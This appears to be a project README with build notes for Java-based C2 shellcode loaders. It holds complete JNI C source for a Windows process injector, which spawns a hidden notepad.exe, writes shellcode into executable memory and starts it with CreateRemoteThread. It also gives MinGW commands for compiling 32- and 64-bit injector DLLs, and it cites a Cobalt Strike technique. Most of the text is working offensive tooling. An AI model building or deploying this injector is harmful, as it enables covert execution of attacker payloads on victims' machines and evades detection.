# run

```
mvn clean package -DskipTests
java -jar target/java_test_web.jar
```

# ASm

java -cp 'asm-6.0_ALPHA.jar:asm-util-6.0_ALPHA.jar'  org.objectweb.asm.util.ASMifier  WindowsVirtualMachine.class

# Mark

C2Loader 为跨平台，但需要走进程方式，否则会造成dos。
WinC2Loader、WinC2Loader1同原理， WindowsVirtualMachine为WinC2Loader、WinC2Loader1的实现方式

LibC2Loader:
https://www.cobaltstrike.com/blog/how-to-inject-shellcode-from-java/


nano /Users/orleven/Product/test/java_test_web/src/main/java/LibC2Loader.java

```
public class LibC2Loader {
public native void inject(byte[] me);
}
```

cd /Users/orleven/Product/test/java_test_web/src/main/resources/dll/
cp /Users/orleven/Product/test/java_test_web/src/main/java/LibC2Loader.java /Users/orleven/Product/test/java_test_web/src/main/resources/dll/src-java
javac -d bin -cp bin src-java/LibC2Loader.java
javah -classpath bin -jni -o src/injector.h LibC2Loader
nano src/injector.c

```
#include <injector.h>

JNIEXPORT void JNICALL Java_LibC2Loader_inject(JNIEnv * env, jobject object, jbyteArray jdata) {
   jbyte * data = (*env)->GetByteArrayElements(env, jdata, 0);
   jsize length = (*env)->GetArrayLength(env, jdata);
   inject((LPCVOID)data, (SIZE_T)length);
   (*env)->ReleaseByteArrayElements(env, jdata, data, 0);
}

/* inject some shellcode... enclosed stuff is the shellcode y0 */
void inject(LPCVOID buffer, int length) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    HANDLE hProcess   = NULL;
    SIZE_T wrote;
    LPVOID ptr;
    char lbuffer[1024];
    char cmdbuff[1024];

    /* reset some stuff */
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    /* start a process */
    GetStartupInfo(&si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = NULL;
    si.hStdError = NULL;
    si.hStdInput = NULL;

    /* resolve windir? */
    GetEnvironmentVariableA("windir", lbuffer, 1024);

    /* setup our path... choose wisely for 32bit and 64bit platforms */
    #ifdef _IS64_
        _snprintf(cmdbuff, 1024, "%s\\SysWOW64\\notepad.exe", lbuffer);
    #else
        _snprintf(cmdbuff, 1024, "%s\\System32\\notepad.exe", lbuffer);
    #endif

    /* spawn the process, baby! */
    if (!CreateProcessA(NULL, cmdbuff, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
        return;

    hProcess = pi.hProcess;
    if( !hProcess )
        return;

    /* allocate memory in our process */
    ptr = (LPVOID)VirtualAllocEx(hProcess, 0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    /* write our shellcode to the process */
    WriteProcessMemory(hProcess, ptr, buffer, (SIZE_T)length, (SIZE_T *)&wrote);
    if (wrote != length)
        return;

    /* create a thread in the process */
    CreateRemoteThread(hProcess, NULL, 0, ptr, NULL, 0, NULL);
}
```

cp C:\Program Files\Java\jdkXXXXXXXX\include include
nano src\injector.def

```
EXPORTS
    Java_LibC2Loader_inject
```

https://ports.macports.org/port/i686-w64-mingw32-gcc/

win 32
i686-w64-mingw32-gcc -c src/*.c -l jni -I include -I include/win32 -Wall -D_JNI_IMPLEMENTATION_ -Wl,--kill-at -shared
i686-w64-mingw32-dllwrap --def src/injector.def injector.o -o temp.dll
strip temp.dll -o bin/injector.dll

win 64
x86_64-w64-mingw32-gcc -m64 -c src/*.c -l jni -I include -I include/win32 -Wall -D_JNI_IMPLEMENTATION_ -D_IS64_ -Wl,--kill-at -shared
x86_64-w64-mingw32-dllwrap -m64 --def src/injector.def injector.o -o temp.dll
strip temp.dll -o bin/injector64.dll

other
i686-w64-mingw32-gcc -c src/*.c -l jni -I include -I include/win32 -Wall -D_JNI_IMPLEMENTATION_ -Wl,--kill-at -shared
i686-w64-mingw32-dllwrap --def src/injector.def injector.o -o temp.dll
strip temp.dll -o bin/injector.dll

add code for java
nano /Users/orleven/Product/test/java_test_web/src/main/java/LibC2Loader.java 
